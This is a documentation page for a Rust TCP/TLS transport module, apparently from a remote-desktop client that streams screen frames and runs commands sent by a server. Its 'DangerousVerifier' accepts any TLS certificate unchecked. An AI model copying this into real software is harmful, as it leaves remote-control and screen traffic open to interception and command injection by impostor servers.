# tcp_transport

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/tcp_transport.rs` |
| **Lines** | 343 |
| **Cards** | T019-networking |
| **Role** | TCP transport layer |

## Types

### struct `DangerousVerifier` (line 20)

## Internal Functions

- `verify_server_cert` (line 23)
- `verify_tls12_signature` (line 29)
- `verify_tls13_signature` (line 34)
- `supported_verify_schemes` (line 39)

## Key Dependencies

- `use anyhow::{Context, Result};`
- `use tokio::io::{AsyncReadExt, AsyncWriteExt};`
- `use tokio::net::TcpStream;`
- `use tokio::sync::{mpsc, watch};`
- `use tracing::{debug, info, warn};`
- `use crate::commands::{self, ClientState};`
- `use crate::protocol::{`
- `use crate::sysinfo_collect;`
- `use tokio_rustls::TlsConnector;`
- `use rustls::ClientConfig;`

## Full Source

```rust
// TCP (+ optional TLS) transport.
// Frame format: [4B length BE][binary-protocol-message]
// Identical inner protocol to WebSocket transport.

use std::sync::{Arc, Mutex};

use anyhow::{Context, Result};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, watch};
use tracing::{debug, info, warn};

use crate::commands::{self, ClientState};
use crate::protocol::{
    build_message, parse_message, MSG_COMMAND, MSG_HELLO, MSG_PING, MSG_PONG, MSG_VNC_DATA,
};
use crate::sysinfo_collect;

#[derive(Debug)]
struct DangerousVerifier;

impl rustls::client::danger::ServerCertVerifier for DangerousVerifier {
    fn verify_server_cert(
        &self, _: &rustls::pki_types::CertificateDer<'_>, _: &[rustls::pki_types::CertificateDer<'_>],
        _: &rustls::pki_types::ServerName<'_>, _: &[u8], _: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self, _: &[u8], _: &rustls::pki_types::CertificateDer<'_>, _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self, _: &[u8], _: &rustls::pki_types::CertificateDer<'_>, _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

// ─── Framing helpers ────────────────────────────────────────────────

async fn read_tcp_message<R: AsyncReadExt + Unpin>(reader: &mut R) -> Result<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    reader.read_exact(&mut len_buf).await.context("TCP read length")?;
    let msg_len = u32::from_be_bytes(len_buf) as usize;
    if msg_len > 10_000_000 {
        anyhow::bail!("TCP frame too large: {} bytes", msg_len);
    }
    let mut msg = vec![0u8; msg_len];
    reader.read_exact(&mut msg).await.context("TCP read message")?;
    Ok(msg)
}

async fn write_tcp_message<W: AsyncWriteExt + Unpin>(writer: &mut W, data: &[u8]) -> Result<()> {
    let len = (data.len() as u32).to_be_bytes();
    writer.write_all(&len).await.context("TCP write length")?;
    writer.write_all(data).await.context("TCP write message")?;
    writer.flush().await.context("TCP flush")?;
    Ok(())
}

// ─── TCP session (plaintext or TLS) ─────────────────────────────────

pub async fn run_tcp_session(
    host: &str,
    port: u16,
    use_tls: bool,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    info!("TCP connecting to {} (tls={})", addr, use_tls);

    let stream = TcpStream::connect(&addr)
        .await
        .context("TCP connect failed")?;
    stream.set_nodelay(true).ok();

    if use_tls {
        run_tls_session(stream, host, target_fps, jpeg_quality, encoding, config_path).await
    } else {
        run_plain_session(stream, target_fps, jpeg_quality, encoding, config_path).await
    }
}

// ─── Plaintext session ──────────────────────────────────────────────

async fn run_plain_session(
    stream: TcpStream,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()> {
    let (reader, writer) = stream.into_split();
    let writer = tokio::io::BufWriter::new(writer);
    run_inner(reader, writer, target_fps, jpeg_quality, encoding, config_path).await
}

// ─── TLS session ────────────────────────────────────────────────────

async fn run_tls_session(
    stream: TcpStream,
    host: &str,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()> {
    use tokio_rustls::TlsConnector;
    use rustls::ClientConfig;

    let config = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(DangerousVerifier))
        .with_no_client_auth();
    let connector = TlsConnector::from(Arc::new(config));
    let server_name: rustls::pki_types::ServerName<'static> = host
        .to_string()
        .try_into()
        .unwrap_or_else(|_| "localhost".to_string().try_into().unwrap());

    let tls_stream = connector
        .connect(server_name, stream)
        .await
        .context("TLS handshake failed")?;

    let (reader, writer) = tokio::io::split(tls_stream);
    let writer = tokio::io::BufWriter::new(writer);
    run_inner(reader, writer, target_fps, jpeg_quality, encoding, config_path).await
}

// ─── Inner session logic (transport-agnostic) ───────────────────────

async fn run_inner<R, W>(
    mut reader: R,
    mut writer: W,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()>
where
    R: AsyncReadExt + Unpin + Send + 'static,
    W: AsyncWriteExt + Unpin + Send + 'static,
{
    // Collect system info and send HELLO
    let (sw, sh, vw, vh, mon_count) = sysinfo_collect::get_screen_dimensions();
    let info = sysinfo_collect::SystemInfo::collect(
        0,
        mon_count,
        sw,
        sh,
        vw,
        vh,
        false,
        false,
        false,
        target_fps,
        jpeg_quality,
        0.0,
        encoding,
    );
    let hello_payload = serde_json::to_vec(&info)?;
    let hello_msg = build_message(MSG_HELLO, &hello_payload);
    write_tcp_message(&mut writer, &hello_msg)
        .await
        .context("TCP HELLO send")?;
    info!("TCP HELLO sent: {} @ {}", info.pc_name, info.ip);

    // Channels: control (priority) + frame (latest-only)
    let (control_tx, mut control_rx) = mpsc::unbounded_channel::<Vec<u8>>();
    let (frame_tx, mut frame_rx) = watch::channel::<Option<Vec<u8>>>(None);

    let state = Arc::new(Mutex::new(ClientState::new(target_fps, jpeg_quality, config_path)));
    {
        let mut st = state.lock().unwrap();
        st.ws_send_tx = Some(control_tx.clone());
        st.current_encoding = encoding.to_string();
    }

    // Writer task: drain control queue first, then frames
    let writer_task = tokio::spawn(async move {
        let mut control_closed = false;
        let mut frame_closed = false;
        loop {
            tokio::select! {
                biased;
                maybe = control_rx.recv(), if !control_closed => {
                    match maybe {
                        Some(data) => {
                            if write_tcp_message(&mut writer, &data).await.is_err() { break; }
                        }
                        None => control_closed = true,
                    }
                }
                changed = frame_rx.changed(), if !frame_closed => {
                    match changed {
                        Ok(()) => {
                            let frame = frame_rx.borrow().clone();
                            if let Some(data) = frame {
                                if write_tcp_message(&mut writer, &data).await.is_err() { break; }
                            }
                        }
                        Err(_) => frame_closed = true,
                    }
                }
            }
            if control_closed && frame_closed {
                break;
            }
        }
    });

    // Send loop (reuse the WebSocket send_loop from main.rs)
    let state_clone = state.clone();
    let control_tx_clone = control_tx.clone();
    let frame_tx_clone = frame_tx.clone();
    let encoding_owned = encoding.to_string();
    let send_task = tokio::spawn(async move {
        crate::send_loop(
            state_clone,
            control_tx_clone,
            frame_tx_clone,
            target_fps,
            jpeg_quality,
            encoding_owned,
        )
        .await
    });

    // Receive loop
    let state_clone2 = state.clone();
    let control_tx_clone2 = control_tx.clone();
    let recv_task = tokio::spawn(async move {
        loop {
            let raw = match read_tcp_message(&mut reader).await {
                Ok(r) => r,
                Err(e) => {
                    info!("TCP recv error: {}", e);
                    break;
                }
            };

            if raw.len() < 5 {
                continue;
            }

            let (msg_type, payload) = match parse_message(&raw) {
                Ok(p) => p,
                Err(e) => {
                    debug!("TCP parse error: {}", e);
                    continue;
                }
            };

            match msg_type {
                MSG_PING => {
                    let _ = control_tx_clone2.send(build_message(MSG_PONG, &payload));
                }
                MSG_VNC_DATA => {
                    let st = state_clone2.lock().unwrap();
                    if let Some(ref vnc) = st.vnc_handle {
                        vnc.feed_rfb_bytes(payload);
                    }
                }
                MSG_COMMAND => {
                    let cmd_val: serde_json::Value = match serde_json::from_slice(&payload) {
                        Ok(v) => v,
                        Err(_) => continue,
                    };
                    let cmd_type = cmd_val
                        .get("type")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();
                    let cmd_payload = cmd_val
                        .get("payload")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();
                    let cmd_payload_clean = if let Some(pos) = cmd_payload.find('|') {
                        let prefix = &cmd_payload[..pos];
                        if prefix.chars().all(|c| c.is_ascii_digit()) {
                            cmd_payload[pos + 1..].to_string()
                        } else {
                            cmd_payload
                        }
                    } else {
                        cmd_payload
                    };

                    let response = tokio::task::block_in_place(|| {
                        let mut st = state_clone2.lock().unwrap();
                        commands::handle_command(&mut st, &cmd_type, &cmd_payload_clean)
                    });

                    if let Ok(Some(reply)) = response {
                        let _ = control_tx_clone2.send(reply);
                    }

                    if state_clone2.lock().unwrap().stop_signal {
                        return Ok::<(), anyhow::Error>(());
                    }
                }
                _ => {
                    debug!("TCP unknown msg type: 0x{:02X}", msg_type);
                }
            }
        }
        anyhow::bail!("TCP stream ended")
    });

    tokio::select! {
        r = send_task => {
            if let Err(e) = r { warn!("TCP send task panic: {}", e); }
        }
        r = writer_task => {
            if let Err(e) = r { warn!("TCP writer panic: {}", e); }
        }
        r = recv_task => {
            match r {
                Ok(Ok(())) => {}
                Ok(Err(e)) => return Err(e),
                Err(e) => warn!("TCP recv panic: {}", e),
            }
        }
    }

    {
        let mut st = state.lock().unwrap();
        st.cleanup();
    }
    anyhow::bail!("TCP session ended")
}

```